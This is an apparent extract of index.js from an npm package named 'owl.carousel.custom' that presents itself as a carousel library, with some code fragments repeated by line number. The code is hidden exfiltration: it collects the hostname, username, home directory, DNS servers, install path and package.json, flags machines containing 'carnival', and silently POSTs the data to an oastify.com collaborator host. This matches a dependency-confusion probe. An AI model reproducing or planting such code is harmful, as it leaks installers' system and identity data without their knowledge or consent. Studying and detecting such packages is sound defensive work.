// File: tmp/tmp6064dy0o/owl.carousel.custom/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const packageJSON = require("./package.json")
Line 8: os.hostname()
Line 10: os.userInfo()
Line 15: {
    const indicators = [hostname, homeDir, resolvedURL, ...dnsServers];
    return indicators.some((field) => field && field.toLowerCase().includes("carnival"));
}
Line 16: const indicators = [hostname, homeDir, resolvedURL, ...dnsServers]
Line 17: indicators.some((field) => field && field.toLowerCase().includes("carnival"))
Line 21: {
    const trackingData = JSON.stringify({
        p: packageName,
        c: __dirname,
        hd: homeDir,
        hn: hostname,
        un: username,
        dns: dnsServers,
        r: resolvedURL,
        v: packageJSON.version,
        pjson: packageJSON,
        carnivalTag: "Possible Carnival Install",
    });

    const postData = querystring.stringify({ msg: trackingData });

    const options = {
        hostname: "hxiia5jzpc6biizj0z5dkqyrlir9f13q.oastify.com", // Replace with Burp Collaborator link
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };

    const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });

    req.on("error", (e) => {
        // console.error(e);
    });

    req.write(postData);
    req.end();
}
Line 48: const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    })
Line 49: {
            process.stdout.write(d);
        }
Line 50: process.stdout.write(d)
Line 58: req.write(postData)
Line 59: req.end()
